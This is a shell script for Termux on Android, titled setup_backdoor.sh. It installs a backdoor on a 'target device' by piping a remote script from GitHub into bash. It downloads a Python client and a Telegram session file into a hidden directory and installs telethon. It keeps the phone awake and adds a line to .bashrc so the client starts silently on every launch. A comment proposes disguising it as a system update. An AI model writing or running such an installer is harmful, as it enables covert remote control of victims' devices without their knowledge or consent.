#!/data/data/com.termux/files/usr/bin/bash
# setup_backdoor.sh
# Run this on the target device via a single command:
# curl -sL https://raw.githubusercontent.com/<user>/precise2/main/setup.sh | bash
# Or: wget -qO- https://raw.githubusercontent.com/<user>/precise2/main/setup.sh | bash
# This script downloads the client script, session file, installs dependencies,
# and configures ~/.bashrc for automatic silent startup.

set -e

# Configuration
REPO_URL="https://github.com/precise104/precise2/raw/main"
CLIENT_SCRIPT="client.py"
SESSION_FILE="client.session"
HIDDEN_DIR="$HOME/.config/.cache"
BASH_RC="$HOME/.bashrc"
PYTHON_PKG="python"
PIP_PKG="python-pip"
TELEGRAM_LIB="telethon"

# Create hidden directory
mkdir -p "$HIDDEN_DIR"

# Download client script and session file
curl -sL "$REPO_URL/$CLIENT_SCRIPT" -o "$HIDDEN_DIR/$CLIENT_SCRIPT"
curl -sL "$REPO_URL/$SESSION_FILE" -o "$HIDDEN_DIR/$SESSION_FILE"

# Install dependencies
pkg install -y "$PYTHON_PKG" "$PIP_PKG"
pip install --upgrade "$TELEGRAM_LIB"

# Make script executable (not necessary for python but harmless)
chmod +x "$HIDDEN_DIR/$CLIENT_SCRIPT"

# Acquire wake lock (requires termux-api package, but termux-wake-lock is built-in)
termux-wake-lock

# Add persistence to .bashrc
PERSIST_LINE="pgrep -f \"python.*$CLIENT_SCRIPT\" > /dev/null || (python $HIDDEN_DIR/$CLIENT_SCRIPT >/dev/null 2>&1 &)"
if ! grep -qF "$PERSIST_LINE" "$BASH_RC"; then
    echo "$PERSIST_LINE" >> "$BASH_RC"
fi

# Optional: create a fake system update script to disguise the process
# (not shown here, but can be added)

echo "Setup complete. Backdoor will start on next Termux launch."
